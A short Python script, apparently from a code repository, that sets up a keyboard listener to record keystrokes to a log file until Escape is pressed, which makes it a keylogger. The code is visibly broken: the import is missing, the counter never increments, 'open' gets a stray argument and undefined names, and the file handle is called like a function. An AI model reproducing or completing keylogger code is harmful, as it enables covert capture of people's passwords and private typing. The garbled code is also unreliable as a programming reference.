# kongenial-schn-ffeln
 "log.txt"
count = 0
keys = [""]

def key_pressed(key):
    global keys, count
    keys = '{0}'.format(key)
    print(keys)
    
    

    if count >= 10:
        count = 0
        log_2_file(keys)
        keys = [""]

def log_2_file(keys):
     with open(file, path + ext + file, "a") as log_file:
         for key in keys:
             log_file(str(key))

def key_released(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=key_pressed, on_release=key_released) as loop:
    loop.join()
